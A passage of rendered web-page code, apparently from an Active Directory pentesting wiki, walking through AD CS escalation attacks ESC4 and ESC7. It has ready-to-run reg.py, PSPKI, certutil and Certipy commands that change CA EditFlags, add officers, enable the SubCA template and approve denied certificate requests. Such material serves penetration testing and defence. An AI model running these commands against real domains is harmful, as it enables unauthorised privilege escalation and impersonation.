`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Set-DomainObject"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"SearchBase "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Identity templateName "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Set "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"{"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'mspki-certificate-application-policy'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'1.3.6.1.5.5.7.3.2'"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"} "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Verbose")])])])],-1)])),_:1})]),_:1}),e[7]||(e[7]=h('<div class="warning custom-block"><p></p><p>If sensitive access entries are identified, creativity will be the best ally.</p><p>Currently, the best resources for manually abusing this are</p><ul><li><a href="https://github.com/daem0nc0re/Abusing_Weak_ACL_on_Certificate_Templates" target="_blank" rel="noreferrer">Abusing weak ACL on Certificate Templates (by daemon0cc0re)</a></li><li><a href="https://http418infosec.com/ad-cs-the-certified-pre-owned-attacks#esc4" target="_blank" rel="noreferrer">AD-CS The Certified Pre Owned Attacks (by HTTP418)</a></li></ul></div><h3 id="certificate-authority-esc7" tabindex="-1">Certificate Authority (ESC7) <a class="header-anchor" href="#certificate-authority-esc7" aria-label="Permalink to &quot;Certificate Authority (ESC7)&quot;">​</a></h3><p>There are two attacks paths for this scenario:</p><ol><li>If an attacker gains control over a principal that&#39;s able to edit the CA server registries (e.g. local admin, or <code>ManageCA</code>?), and is able to restart the <code>CertSrv</code> service on the server, he can make the CA vulnerable to ESC6 and exploit that</li><li>Alternatively, if an attacker gains control over a principal that has the <code>ManageCA</code> right over the CA object, he can remotely obtain the <code>ManageCertificates</code> right and with those two rights combined, approve pending certificate requests, subverting the &quot;CA certificate manager approval&quot; protection (referred to as PREVENT4 in <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf" target="_blank" rel="noreferrer">the research whitepaper</a>).</li></ol><h4 id="esc7-exposing-to-esc6" tabindex="-1">ESC7 - Exposing to ESC6 <a class="header-anchor" href="#esc7-exposing-to-esc6" aria-label="Permalink to &quot;ESC7 - Exposing to ESC6&quot;">​</a></h4><p>If sufficient rights are obtained over the Certificate Authority (<code>ManageCA</code>?, local admin account, ...) an attacker could remotely edit the registries, enable the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> attribute, restart the <code>CertSvc</code> service, and abuse <a href="./certificate-authority">ESC6 (CA configuration abuse)</a>.</p>',6)),t(r,null,{default:a(()=>[t(l,{label:"UNIX-like"},{default:a(()=>e[2]||(e[2]=[i("p",null,"The attack can be carried out from UNIX-like systems as follows.",-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# /!\\ Beware: change placeholder values CA-NAME, VALUE, NEW_VALUE")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# query flags")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"reg.py"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"/"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'":"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"@$"ADCS_IP"'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," query"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -keyName"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\CA-NAME\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -v"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," editflags")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# bitwise OR to set the flag if not already (nothing changed if already set)")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"python3"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -c"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," print"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"("),i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},'"NEW_VALUE:"'),i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},","),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," VALUE"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," |"),i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," 0x40000"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# write flags")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"reg.py"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"/"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'":"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"@$"ADCS_IP"'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," add-keyName"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\CA-NAME\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -v"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," editflags"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -vd"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," NEW_VALUE")])])])],-1)])),_:1}),t(l,{label:"Windows"},{default:a(()=>e[3]||(e[3]=[i("p",null,[s("From Windows systems, the "),i("a",{href:"https://github.com/GhostPack/Certify",target:"_blank",rel:"noreferrer"},"Certify"),s(" (C#) tool can be used to enumerate info about the CAs, including access rights over the CA object.")],-1),i("p",null,[s("Then, "),i("a",{href:"https://github.com/PKISolutions/PSPKI",target:"_blank",rel:"noreferrer"},"PSPKI"),s(" (PowerShell) can be used to modify the CA object ("),i("a",{href:"https://docs.microsoft.com/fr-fr/troubleshoot/windows-server/system-management-components/remote-server-administration-tools",target:"_blank",rel:"noreferrer"},"RSAT"),s(" is needed on the machine where PSPKI is run).")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," cas")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Install PSPKI")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Install-Module"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Name PSPKI")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Import-Module"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," PSPKI")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Get the current value of EDITF_ATTRIBUTESUBJECTALTNAME2 and modify it with SetConfigEntry")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$configReader "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," New-Object"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"CA.domain.local"')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$configReader.SetRootNode("),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"$true"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$configReader.GetConfigEntry("),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"EditFlags"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},","),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$configReader.SetConfigEntry("),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"1376590"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},","),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "EditFlags"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},","),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Check after setting the flag (EDITF_ATTRIBUTESUBJECTALTNAME2 should appear in the output)")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"certutil.exe"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"config "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"CA.domain.local\\CA"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"getreg "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"policy\\EditFlags"')])])])],-1),i("p",null,"If RSAT is not present, it can installed like this:",-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"DISM.exe"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Online "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Get-Capabilities")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"DISM.exe"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Online "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"add-capability"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"CapabilityName:Rsat.CertificateServices.Tools~~~~"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"0.0"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"."),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"1.0")])])])],-1)])),_:1})]),_:1}),e[8]||(e[8]=h('<h4 id="esc7-abusing-subca" tabindex="-1">ESC7 - Abusing <code>SubCA</code> <a class="header-anchor" href="#esc7-abusing-subca" aria-label="Permalink to &quot;ESC7 - Abusing `SubCA`&quot;">​</a></h4><p>When it is not possible to restart the <code>CertSvc</code> service to enable the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> attribute, the <code>SubCA</code> built-in template can be used, along with a <code>ManageCA</code> right.</p><p>The <code>SubCA</code> template is vulnerable to the ESC1 attack, but only Domain Admins and Enterprise Admins can enroll in it. If a standard user tries to enroll in it, he will encounter a <code>CERTSRV_E_TEMPLATE_DENIED</code> errror and will obtain a request ID with a corresponding private key.</p><p>This ID can be used by a user with the <code>ManageCA</code> and <code>ManageCertificates</code> rights to validate the failed request anyway. The user can then retrieve the issued certificate by specifying the same ID.</p>',4)),t(r,null,{default:a(()=>[t(l,{label:"UNIX-like"},{default:a(()=>e[4]||(e[4]=[i("p",null,[s("If the attacker only has the "),i("code",null,"ManageCA"),s(" permission, "),i("a",{href:"https://github.com/ly4k/Certipy",target:"_blank",rel:"noreferrer"},"Certipy"),s(" (Python) can be used to enumerate access rights over the CA object ("),i("a",{href:"./#attack-paths"},"how to enumerate"),s(") and modify some CA's attributes like the officers list (an officer is a user with the "),i("code",null,"ManageCertificates"),s(" right). The attacker could also enable or disable certificate templates.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Add a new officier")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ca"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ca"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ca_name'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -add-officer"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'user'")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# List all the templates")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ca"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ca"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ca_name'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -list-templates")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Enable a certificate template")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ca"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ca"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ca_name'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -enable-template"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'SubCA'")])])])],-1),i("p",null,[s("In order to abuse the "),i("code",null,"SubCA"),s(" template with ESC7, both "),i("code",null,"ManageCA"),s(" and "),i("code",null,"ManageCertificates"),s(" are needed in order to issue a certificate from a failed request.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Issue a failed request (need ManageCA and ManageCertificates rights for a failed request)")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ca"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -target"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$ADCS_HOST"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ca"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ca_name'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -issue-request"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 100")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Retrieve an issued certificate")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," req"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -target"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$ADCS_HOST"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ca"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ca_name'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -retrieve"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 100")])])])],-1),i("p",null,[s("The certificate can then be used with "),i("a",{href:"./../kerberos/pass-the-certificate"},"Pass-The-Certificate"),s(" to obtain a TGT and authenticate.")],-1)])),_:1}),t(l,{label:"Windows"},{default:a(()=>e[5]||(e[5]=[i("p",null,[s("From Windows systems, the "),i("a",{href:"https://github.com/GhostPack/Certify",target:"_blank",rel:"noreferrer"},"Certify"),s(" (C#) tool can be used to enumerate info about the CAs, including access rights over the CA object, and to request a certificate that requires manager approval.")],-1),i("p",null,[s("In this example, both "),i("code",null,"ManageCA"),s(" and "),i("code",null,"ManageCertificates"),s(" are already obtained. There is no known method to obtain the "),i("code",null,"ManageCertificates"),s(" right.")],-1),i("p",null,[s("Then, "),i("a",{href:"https://github.com/PKISolutions/PSPKI",target:"_blank",rel:"noreferrer"},"PSPKI"),s(" (PowerShell) can be used to approve a certificate request ("),i("a",{href:"https://docs.microsoft.com/fr-fr/troubleshoot/windows-server/system-management-components/remote-server-administration-tools",target:"_blank",rel:"noreferrer"},"RSAT"),s(' is needed on the machine where 